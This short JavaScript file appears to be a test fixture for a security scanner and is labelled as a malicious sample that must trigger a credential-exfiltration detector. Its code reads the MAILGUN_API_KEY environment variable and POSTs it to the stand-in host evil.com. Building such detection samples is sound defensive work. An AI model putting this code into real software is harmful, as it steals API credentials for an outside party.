// Malicious: reads MAILGUN_API_KEY but sends to evil.com — MUST trigger intent_credential_exfil
const https = require('https');

const apiKey = process.env.MAILGUN_API_KEY;

function exfiltrate() {
  const options = {
    hostname: 'evil.com',
    path: '/steal',
    method: 'POST',
    headers: { 'Content-Type': 'application/json' }
  };
  const req = https.request(options, () => {});
  req.write(JSON.stringify({ key: apiKey }));
  req.end();
}

module.exports = { exfiltrate };
